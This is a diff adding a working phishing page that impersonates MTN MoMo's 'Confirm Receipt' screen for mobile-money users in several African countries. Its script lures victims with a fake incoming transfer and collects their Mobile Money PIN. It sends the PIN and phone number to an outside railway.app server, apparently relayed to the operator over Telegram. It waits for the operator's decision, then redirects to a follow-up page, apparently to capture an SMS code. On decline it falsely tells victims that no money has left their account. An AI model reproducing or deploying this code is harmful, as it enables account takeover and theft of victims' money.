@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN MoMo · Confirm Receipt</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-yellow:        #FFCC00;
+    --mtn-yellow-dark:   #F5B500;
+    --mtn-yellow-light:  #FFF8E1;
+    --mtn-blue:          #0047AB;
+    --mtn-blue-dark:     #003380;
+    --mtn-navy:          #003366;
+    --mtn-white:         #FFFFFF;
+    --mtn-text:          #1F2937;
+    --mtn-muted:         #6B7280;
+    --mtn-border:        #E5E7EB;
+    --mtn-soft:          #F8FAFC;
+    --mtn-page:          #F1F5F9;
+    --mtn-green:         #22A356;
+    --mtn-red:           #E31B23;
+    --input-border:       rgba(255,255,255,0.30);
+    --input-border-focus: rgba(255,204,0,0.85);
+    --muted:              rgba(255,255,255,0.68);
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
+    display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
+    color: var(--mtn-white);
+  }
+  .phone::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: var(--mtn-yellow); z-index: 2;
+  }
+
+  .brand-block {
+    text-align: center; padding: 40px 24px 0;
+    display: flex; flex-direction: column; align-items: center; gap: 20px;
+  }
+  .brand-logo-wrap {
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    min-height: 48px;
+  }
+  .brand-logo {
+    height: 48px; width: auto; display: block;
+    border-radius: 8px; object-fit: contain;
+    background: #fff; padding: 3px 6px;
+  }
+  .brand-name-text {
+    font-size: 26px; font-weight: 800; letter-spacing: -0.6px;
+    color: var(--mtn-white); line-height: 1; white-space: nowrap;
+  }
+  .brand-name-text .brand-momo { color: var(--mtn-yellow); }
+
+  .brand-titles {
+    display: flex; flex-direction: column; gap: 4px;
+  }
+  .brand-title {
+    font-size: 18px; font-weight: 700; color: var(--mtn-white);
+    letter-spacing: -0.2px; line-height: 1.3;
+  }
+  .brand-sub {
+    font-size: 12.5px; color: var(--muted); font-weight: 500;
+    letter-spacing: 0.2px;
+  }
+
+  .amount-line {
+    text-align: center; padding: 24px 24px 0;
+    display: flex; flex-direction: column; gap: 4px;
+  }
+  .amount-line .alabel {
+    font-size: 10.5px; font-weight: 700; letter-spacing: 0.7px;
+    text-transform: uppercase; color: var(--muted);
+  }
+  .amount-line .aval {
+    font-size: 28px; font-weight: 800; letter-spacing: -0.6px;
+    color: var(--mtn-yellow); line-height: 1.2;
+  }
+
+  .form-area {
+    flex: 1; padding: 28px 30px 20px;
+    display: flex; flex-direction: column;
+  }
+  .field { margin-bottom: 22px; position: relative; }
+  .field label {
+    display: block; font-size: 11.5px; font-weight: 700;
+    letter-spacing: 0.8px; text-transform: uppercase;
+    color: var(--muted); margin-bottom: 8px;
+  }
+  .pin-helper {
+    display: block;
+    font-size: 11.5px;
+    font-weight: 500;
+    color: rgba(255,255,255,0.72);
+    line-height: 1.45;
+    margin: -2px 0 10px;
+  }
+  .phone-input-wrap, .pin-input-wrap {
+    display: flex; align-items: center; gap: 8px;
+    border-bottom: 1.5px solid var(--input-border);
+    padding-bottom: 8px; transition: border-color .15s;
+  }
+  .pin-input-wrap:focus-within { border-bottom-color: var(--input-border-focus); }
+  .phone-input-wrap .dial {
+    font-size: 15px; font-weight: 700; color: var(--mtn-yellow);
+    letter-spacing: 0.3px; flex-shrink: 0;
+  }
+  .phone-input-wrap input, .pin-input-wrap input {
+    flex: 1; min-width: 0; background: transparent; border: none; outline: none;
+    color: var(--mtn-white); font-family: inherit; font-size: 16px; font-weight: 600;
+    padding: 2px 0;
+  }
+  .phone-input-wrap input { letter-spacing: 0.3px; }
+  .pin-input-wrap input { letter-spacing: 4px; }
+  .phone-input-wrap input::placeholder,
+  .pin-input-wrap input::placeholder {
+    color: rgba(255,255,255,0.42); font-weight: 500;
+  }
+  .pin-input-wrap input::placeholder { letter-spacing: 1px; }
+  .eye-btn {
+    flex-shrink: 0; background: transparent; border: none; padding: 6px; cursor: pointer;
+    color: rgba(255,255,255,0.7); display: inline-flex; align-items: center; justify-content: center;
+    transition: color .15s; min-width: 36px; min-height: 36px;
+  }
+  .eye-btn:hover { color: var(--mtn-yellow); }
+  .eye-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; }
+
+  .field-error {
+    display: none; font-size: 11.5px; color: var(--mtn-yellow);
+    margin-top: 6px; font-weight: 600; line-height: 1.4;
+  }
+  .field.invalid .field-error { display: block; }
+  .field.invalid .pin-input-wrap,
+  .field.invalid .phone-input-wrap { border-bottom-color: var(--mtn-yellow); }
+
+  .status-banner {
+    display: none; padding: 11px 14px; border-radius: 10px;
+    font-size: 12.5px; font-weight: 600; line-height: 1.5;
+    margin-bottom: 16px; text-align: center;
+    white-space: pre-wrap; word-break: break-word;
+  }
+  .status-banner.show { display: block; }
+  .status-banner.error { background: rgba(227,27,35,0.20); color: #FFE04D; border: 1px solid rgba(255,224,77,0.35); }
+
+  .btn-signin {
+    width: 100%; min-height: 64px;
+    background: var(--mtn-yellow); color: var(--mtn-navy);
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px;
+    border: none; border-radius: 12px; cursor: pointer; margin-top: 12px;
+    box-shadow: 0 10px 24px rgba(0, 0, 0, 0.25);
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
+  }
+  .btn-signin:hover { filter: brightness(0.97); }
+  .btn-signin:active { transform: scale(0.985); }
+  .btn-signin:disabled { opacity: 0.72; cursor: wait; }
+
+  .terms {
+    text-align: center; font-size: 11px; color: var(--muted);
+    line-height: 1.6; margin-top: auto; padding: 24px 30px 0;
+  }
+  .terms a { color: var(--mtn-yellow); font-weight: 700; text-decoration: underline; text-underline-offset: 2px; }
+
+  .contact {
+    display: flex; flex-direction: column; align-items: center; gap: 8px;
+    padding: 20px 24px 26px;
+  }
+  .contact-btn {
+    width: 50px; height: 50px; border-radius: 50%;
+    background: var(--mtn-yellow);
+    display: inline-flex; align-items: center; justify-content: center;
+    border: none; cursor: pointer;
+    box-shadow: 0 10px 22px rgba(255,204,0,0.32);
+    transition: transform .12s ease, filter .15s; text-decoration: none;
+  }
+  .contact-btn svg {
+    width: 22px; height: 22px; stroke: var(--mtn-navy); fill: none;
+    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .contact-label {
+    font-size: 11.5px; font-weight: 600; letter-spacing: 0.3px;
+    color: var(--muted);
+  }
+
+  .initiating {
+    position: fixed; inset: 0;
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 24px; z-index: 9999; text-align: center;
+    color: var(--mtn-white);
+  }
+  .initiating.show { display: flex; }
+  .initiating .brand-row {
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    margin-bottom: 40px;
+  }
+  .initiating .brand-row img {
+    height: 32px; width: auto;
+    border-radius: 6px; object-fit: contain;
+    background: #fff; padding: 2px 5px;
+  }
+  .initiating .brand-row .mini-text {
+    font-size: 20px; font-weight: 800; color: var(--mtn-white);
+    letter-spacing: -0.5px;
+  }
+  .initiating .brand-row .mini-text .brand-momo { color: var(--mtn-yellow); }
+  .initiating h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 8px;
+  }
+  .initiating p {
+    font-size: 13px; color: var(--muted);
+    max-width: 280px; line-height: 1.6; margin: 0 auto 32px;
+  }
+  .spinner {
+    width: 56px; height: 56px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 28px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .initiating .note {
+    font-size: 11px; color: rgba(255,255,255,0.55);
+    margin-top: 8px; line-height: 1.5;
+  }
+  .initiating .cancel-link {
+    margin-top: 32px;
+    background: transparent; border: none; cursor: pointer;
+    color: var(--muted);
+    font-family: inherit; font-size: 12px; font-weight: 600;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .initiating .cancel-link:hover { color: var(--mtn-yellow); }
+
+  .toast {
+    position: fixed; bottom: 90px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--mtn-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 10000; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.30);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  @media (pointer: coarse) {
+    .pin-input-wrap input, .phone-input-wrap input { font-size: 17px; }
+    .btn-signin { min-height: 66px; font-size: 17px; }
+    .phone-input-wrap, .pin-input-wrap { padding-bottom: 10px; }
+  }
+  @media (orientation: landscape) and (max-height: 500px) {
+    .brand-block { padding: 16px 24px 0; gap: 12px; }
+    .brand-logo { height: 36px; }
+    .brand-name-text { font-size: 20px; }
+    .brand-title { font-size: 15px; }
+    .amount-line { padding: 12px 24px 0; }
+    .amount-line .aval { font-size: 20px; }
+    .form-area { padding: 12px 26px 12px; }
+    .field { margin-bottom: 12px; }
+    .terms { padding: 8px 26px 0; margin-top: 6px; }
+    .contact { flex-direction: row; gap: 12px; padding: 8px 24px 14px; justify-content: center; }
+    .contact-btn { width: 38px; height: 38px; }
+    .contact-btn svg { width: 18px; height: 18px; }
+    .contact-label { font-size: 11px; }
+    .btn-signin { min-height: 52px; font-size: 15px; }
+  }
+  @media (max-width: 380px) {
+    .brand-block { padding-top: 30px; }
+    .brand-logo { height: 40px; }
+    .brand-name-text { font-size: 22px; }
+    .brand-title { font-size: 16px; }
+    .amount-line { padding-top: 20px; }
+    .amount-line .aval { font-size: 24px; }
+    .form-area { padding: 22px 22px 16px; }
+    .btn-signin { min-height: 60px; font-size: 16px; }
+    .contact-btn { width: 46px; height: 46px; }
+    .contact-btn svg { width: 20px; height: 20px; }
+    .initiating h2 { font-size: 18px; }
+    .spinner { width: 46px; height: 46px; }
+  }
+  @media (max-height: 680px) {
+    .brand-block { padding-top: 24px; gap: 14px; }
+    .brand-logo { height: 40px; }
+    .form-area { padding-top: 18px; }
+    .field { margin-bottom: 16px; }
+    .terms { padding-top: 16px; }
+    .contact { padding-top: 14px; padding-bottom: 18px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 20px;
+      box-shadow: 0 40px 100px rgba(0,71,171,0.28); overflow: hidden;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="brand-block">
+    <div class="brand-logo-wrap">
+      <img
+        class="brand-logo"
+        src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+        alt="MTN MoMo"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-name-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
+    </div>
+    <div class="brand-titles">
+      <div class="brand-title" id="brandTitle">Confirm your receipt</div>
+      <div class="brand-sub" id="brandSub">Sign in to continue</div>
+    </div>
+  </div>
+
+  <div class="amount-line">
+    <span class="alabel" id="amountLabel">Amount</span>
+    <span class="aval" id="amountValue">—</span>
+  </div>
+
+  <form class="form-area" id="signinForm" novalidate onsubmit="handleSignIn(event)">
+
+    <div class="status-banner" id="statusBanner"></div>
+
+    <div class="field" id="f-phone">
+      <label for="phoneInput" id="phoneLabel">Phone number</label>
+      <div class="phone-input-wrap">
+        <span class="dial" id="dialCode">+267</span>
+        <input
+          type="tel" id="phoneInput" inputmode="numeric" autocomplete="tel"
+          placeholder="Enter phone number" maxlength="15" readonly
+        >
+      </div>
+      <div class="field-error" id="phoneError">No phone number was provided by the sender.</div>
+    </div>
+
+    <div class="field" id="f-pin">
+      <label for="pinInput" id="pinLabel">Mobile Money PIN</label>
+      <span class="pin-helper" id="pinHelper">The 4–6 digit PIN you use on your Mobile Money app</span>
+      <div class="pin-input-wrap">
+        <input type="password" id="pinInput" inputmode="numeric" autocomplete="off" placeholder="Mobile Money PIN">
+        <button type="button" class="eye-btn" onclick="togglePin()" aria-label="Show or hide PIN">
+          <svg viewBox="0 0 24 24" id="eyeIcon">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <div class="field-error" id="pinError">Please enter your Mobile Money PIN.</div>
+    </div>
+
+    <button type="submit" class="btn-signin" id="signinBtn">Confirm Receipt</button>
+  </form>
+
+  <div class="terms" id="termsBlock">
+    By using this service you agree to our
+    <a href="terms.html" target="_blank" rel="noopener" id="termsLink">T&amp;Cs</a>
+  </div>
+
+  <div class="contact">
+    <a class="contact-btn" href="#" id="contactLink" aria-label="Contact customer care">
+      <svg viewBox="0 0 24 24">
+        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/>
+      </svg>
+    </a>
+    <div class="contact-label" id="contactLabel">Customer Care</div>
+  </div>
+</div>
+
+<div class="initiating" id="initiating">
+  <div class="brand-row">
+    <img
+      src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+      alt="MTN MoMo"
+      referrerpolicy="no-referrer"
+      onerror="this.style.display='none'"
+    >
+    <span class="mini-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
+  </div>
+
+  <div class="spinner"></div>
+
+  <h2 id="initiatingTitle">Confirming your receipt…</h2>
+  <p id="initiatingDesc">Connecting securely to MTN MoMo to confirm this incoming transfer. Please do not close this page.</p>
+
+  <div class="note" id="initiatingNote">This usually takes a few seconds.</div>
+
+  <button class="cancel-link" onclick="cancelInitiating()" id="cancelBtn">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const API_BASE = 'https://mobile-bank-receipt-production.up.railway.app';
+  const INITIAL_FETCH_TIMEOUT_MS = 20000;
+
+  const I18N = {
+    en: {
+      brandTitle: 'Confirm your receipt',
+      brandSubFallback: 'Sign in to continue',
+      brandSubCountry: 'Confirm to receive your transfer',
+      amountLabel: 'Amount',
+      phoneLabel: 'Phone number',
+      phonePlaceholder: 'Enter phone number',
+      phoneError: 'No phone number was provided by the sender.',
+      pinLabel: 'Mobile Money PIN',
+      pinHelper: 'The 4–6 digit PIN you use on your Mobile Money app',
+      pinPlaceholder: 'Mobile Money PIN',
+      pinError: 'Please enter your Mobile Money PIN.',
+      signIn: 'Confirm Receipt',
+      termsText: 'By using this service you agree to our',
+      termsLink: 'T&Cs',
+      contactLabel: 'Customer Care',
+      initiatingTitle: 'Confirming your receipt…',
+      initiatingDesc: 'Connecting securely to MTN MoMo to confirm this incoming transfer. Please do not close this page.',
+      initiatingNote: 'This usually takes a few seconds.',
+      cancel: 'Cancel',
+      declineBanner: 'Incorrect PIN. Please try again. No money has left your account.',
+      checkFields: 'Please check the highlighted fields.',
+      networkError: 'Network error. Please try again.',
+      timeoutError: 'Request timed out. Please try again.',
+      serverError: 'Service temporarily unavailable. Please try again shortly.',
+      missingRef: 'This confirmation link is invalid or incomplete.',
+      approvedRedirecting: 'Confirmed. Redirecting…',
+      docTitle: 'MTN MoMo · Confirm Receipt'
+    },
+    fr: {
+      brandTitle: 'Confirmez votre reçu',
+      brandSubFallback: 'Connectez-vous pour continuer',
+      brandSubCountry: 'Confirmez pour recevoir votre virement',
+      amountLabel: 'Montant',
+      phoneLabel: 'Numéro de téléphone',
+      phonePlaceholder: 'Entrez le numéro de téléphone',
+      phoneError: 'Aucun numéro de téléphone n\'a été fourni par l\'expéditeur.',
+      pinLabel: 'Code PIN Mobile Money',
+      pinHelper: 'Le code PIN à 4–6 chiffres de votre application Mobile Money',
+      pinPlaceholder: 'Code PIN Mobile Money',
+      pinError: 'Veuillez saisir votre code PIN Mobile Money.',
+      signIn: 'Confirmer le reçu',
+      termsText: 'En utilisant ce service, vous acceptez nos',
+      termsLink: 'Conditions',
+      contactLabel: 'Service Client',
+      initiatingTitle: 'Confirmation de la réception…',
+      initiatingDesc: 'Connexion sécurisée à MTN MoMo pour confirmer ce virement entrant. Veuillez ne pas fermer cette page.',
+      initiatingNote: 'Cela prend généralement quelques secondes.',
+      cancel: 'Annuler',
+      declineBanner: 'Code PIN incorrect. Veuillez réessayer. Aucun argent n\'a quitté votre compte.',
+      checkFields: 'Veuillez vérifier les champs en surbrillance.',
+      networkError: 'Erreur réseau. Veuillez réessayer.',
+      timeoutError: 'Délai expiré. Veuillez réessayer.',
+      serverError: 'Service temporairement indisponible. Veuillez réessayer sous peu.',
+      missingRef: 'Ce lien de confirmation est invalide ou incomplet.',
+      approvedRedirecting: 'Confirmé. Redirection…',
+      docTitle: 'MTN MoMo · Confirmer la réception'
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  let currentLang = I18N[urlLang] ? urlLang : 'en';
+  let T = I18N[currentLang];
+  const DEBUG = urlParams.get('debug') === '1';
+
+  const COUNTRY_DIAL = {
+    'Cameroon': '+237',
+    'Zambia': '+260',
+    'Zambia (MTN)': '+260',
+    'Uganda': '+256',
+    'Uganda (MTN)': '+256',
+    'Ghana': '+233',
+    'Ghana (MTN)': '+233',
+    'Benin': '+229',
+    'Botswana': '+267',
+    'Rwanda': '+250',
+    'eSwatini': '+268',
+    'Côte d\'Ivoire': '+225',
+    'Congo Brazzaville': '+242',
+    'Liberia': '+231'
+  };
+  const COUNTRY_SUPPORT = {
+    'Cameroon': 'tel:233421212',
+    'Zambia': 'tel:111',
+    'Zambia (MTN)': 'tel:111',
+    'Uganda': 'tel:100',
+    'Uganda (MTN)': 'tel:100',
+    'Ghana': 'tel:100',
+    'Ghana (MTN)': 'tel:100',
+    'Benin': 'tel:111',
+    'Botswana': 'tel:3999100',
+    'Rwanda': 'tel:111',
+    'eSwatini': 'tel:112',
+    'Côte d\'Ivoire': 'tel:111',
+    'Congo Brazzaville': 'tel:111',
+    'Liberia': 'tel:111'
+  };
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    pu:  urlParams.get('pu') || ''
+  };
+
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', BWP: 'en-BW', USD: 'en-US',
+    RWF: 'en-RW', SZL: 'en-SZ', LRD: 'en-LR'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + (currency || '');
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('brandTitle').textContent = T.brandTitle;
+    document.getElementById('amountLabel').textContent = T.amountLabel;
+    document.getElementById('phoneLabel').textContent = T.phoneLabel;
+    document.getElementById('phoneInput').placeholder = T.phonePlaceholder;
+    document.getElementById('phoneError').textContent = T.phoneError;
+    document.getElementById('pinLabel').textContent = T.pinLabel;
+    document.getElementById('pinHelper').textContent = T.pinHelper;
+    document.getElementById('pinInput').placeholder = T.pinPlaceholder;
+    document.getElementById('pinError').textContent = T.pinError;
+    document.getElementById('signinBtn').textContent = T.signIn;
+    document.getElementById('termsBlock').childNodes[0].nodeValue = T.termsText + ' ';
+    document.getElementById('termsLink').textContent = T.termsLink;
+    document.getElementById('contactLabel').textContent = T.contactLabel;
+    document.getElementById('initiatingTitle').textContent = T.initiatingTitle;
+    document.getElementById('initiatingDesc').textContent = T.initiatingDesc;
+    document.getElementById('initiatingNote').textContent = T.initiatingNote;
+    document.getElementById('cancelBtn').textContent = T.cancel;
+    applyBrandSub();
+    applyAmount();
+  }
+
+  function applyBrandSub() {
+    const subEl = document.getElementById('brandSub');
+    if (tx.c) {
+      subEl.textContent = T.brandSubCountry;
+    } else {
+      subEl.textContent = T.brandSubFallback;
+    }
+  }
+
+  function applyAmount() {
+    const el = document.getElementById('amountValue');
+    if (tx.am) {
+      el.textContent = formatAmount(tx.am, tx.cur);
+    } else {
+      el.textContent = '—';
+    }
+  }
+
+  function applyCountry() {
+    const dial = COUNTRY_DIAL[tx.c] || '+267';
+    document.getElementById('dialCode').textContent = dial;
+
+    let rawPhone = String(tx.an || '').replace(/\D/g, '');
+    const ccDigits = dial.replace(/[^\d]/g, '');
+    if (ccDigits && rawPhone.startsWith(ccDigits)) {
+      rawPhone = rawPhone.slice(ccDigits.length);
+    }
+    rawPhone = rawPhone.replace(/^0+/, '');
+
+    document.getElementById('phoneInput').value = rawPhone;
+
+    const support = COUNTRY_SUPPORT[tx.c];
+    if (support) document.getElementById('contactLink').href = support;
+  }
+
+  let pinVisible = false;
+  function togglePin() {
+    const pin = document.getElementById('pinInput');
+    pinVisible = !pinVisible;
+    pin.type = pinVisible ? 'text' : 'password';
+    document.getElementById('eyeIcon').innerHTML = pinVisible
+      ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/>`
+      : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+  }
+
+  function setInvalid(id) { document.getElementById(id).classList.add('invalid'); }
+  function clearInvalid(id) { document.getElementById(id).classList.remove('invalid'); }
+
+  function validateForm() {
+    clearInvalid('f-phone');
+    clearInvalid('f-pin');
+    let ok = true;
+
+    const phone = document.getElementById('phoneInput').value.replace(/\D/g, '');
+    if (phone.length < 6) { setInvalid('f-phone'); ok = false; }
+
+    const pin = document.getElementById('pinInput').value;
+    if (!pin || pin.length < 4) { setInvalid('f-pin'); ok = false; }
+
+    return ok;
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  function showBanner(msg, isError = true) {
+    const b = document.getElementById('statusBanner');
+    b.className = 'status-banner show' + (isError ? ' error' : '');
+    b.textContent = msg;
+  }
+  function showDeclineBanner() {
+    showBanner(T.declineBanner, true);
+  }
+  function hideBanner() {
+    const b = document.getElementById('statusBanner');
+    b.className = 'status-banner';
+    b.textContent = '';
+  }
+  function showInitiating() {
+    document.getElementById('initiating').classList.add('show');
+    document.getElementById('initiatingNote').textContent = T.initiatingNote;
+  }
+  function hideInitiating() {
+    document.getElementById('initiating').classList.remove('show');
+  }
+  function updateInitiatingNote(text) {
+    document.getElementById('initiatingNote').textContent = text;
+  }
+
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function resetButton() {
+    const btn = document.getElementById('signinBtn');
+    btn.disabled = false;
+    btn.textContent = T.signIn;
+  }
+
+  function cancelInitiating() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    hideInitiating();
+    resetButton();
+  }
+
+  async function fetchWithTimeout(url, options, timeoutMs) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      return await fetch(url, { ...options, signal: controller.signal });
+    } finally {
+      clearTimeout(timer);
+    }
+  }
+
+  async function handleSignIn(e) {
+    e.preventDefault();
+    hideBanner();
+
+    if (!tx.ref) {
+      showBanner(T.missingRef, true);
+      return;
+    }
+
+    if (!validateForm()) {
+      showToast(T.checkFields);
+      return;
+    }
+
+    const btn = document.getElementById('signinBtn');
+    btn.disabled = true;
+
+    const dial = document.getElementById('dialCode').textContent;
+    const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
+    const pin = document.getElementById('pinInput').value;
+
+    const payload = {
+      tx: tx.ref,
+      pin: pin,
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      an: tx.an,
+      rn: tx.rn,
+      phone: dial + phoneDigits,
+      lang: currentLang
+    };
+    if (DEBUG) console.log('[pin] POST', API_BASE + '/api/mtn/pin', payload);
+
+    showInitiating();
+
+    let responseJson = null;
+    let httpStatus = 0;
+    try {
+      const r = await fetchWithTimeout(
+        API_BASE + '/api/mtn/pin',
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        },
+        INITIAL_FETCH_TIMEOUT_MS
+      );
+      httpStatus = r.status;
+      try { responseJson = await r.json(); } catch (_) { responseJson = null; }
+    } catch (err) {
+      console.error('[pin] network failure:', err);
+      hideInitiating();
+      resetButton();
+      showToast(err && err.name === 'AbortError' ? T.timeoutError : T.networkError);
+      return;
+    }
+
+    // ── Server rejected the POST ──
+    if (httpStatus < 200 || httpStatus >= 300) {
+      console.error('[pin] server error:', httpStatus, responseJson);
+      hideInitiating();
+      resetButton();
+
+      const code = responseJson && responseJson.code;
+      const serverMsg = responseJson && responseJson.message;
+
+      if (code === 'telegram_not_configured') {
+        showToast(T.serverError);
+      } else if (code === 'telegram_timeout') {
+        showToast(T.timeoutError);
+      } else if (httpStatus === 502 || httpStatus === 503 || httpStatus === 504) {
+        showToast(T.serverError);
+      } else if (serverMsg) {
+        showToast(String(serverMsg).slice(0, 140));
+      } else {
+        showToast(T.networkError);
+      }
+      return;
+    }
+
+    // ── Success: poll for decision ──
+    pollingActive = true;
+    const start = Date.now();
+    const maxWaitMs = 2 * 60 * 1000;
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - start > maxWaitMs) {
+        pollingActive = false;
+        hideInitiating();
+        resetButton();
+        showToast(T.timeoutError);
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch(
+          API_BASE + '/api/mtn/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now()
+        );
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (err) {
+        console.warn('[signin poll] fetch error:', err);
+      }
+
+      if (!pollingActive) return;
+
+      if (decision === 'approved') {
+        pollingActive = false;
+        updateInitiatingNote(T.approvedRedirecting);
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+          pu: tx.pu, lang: currentLang
+        });
+        setTimeout(() => {
+          window.location.href = 'sms.html?' + q.toString();
+        }, 400);
+        return;
+      }
+
+      if (decision === 'inactive') {
+        pollingActive = false;
+        hideInitiating();
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an,
+          pu: tx.pu,
+          reason: 'inactive',
+          lang: currentLang
+        });
+        window.location.href = 'oops.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'declined' || decision === 'expired') {
+        pollingActive = false;
+        hideInitiating();
+        resetButton();
+        document.getElementById('pinInput').value = '';
+        document.getElementById('pinInput').focus();
+        showDeclineBanner();
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    applyTranslations();
+    applyCountry();
+  });
+</script>
+</body>
+</html>
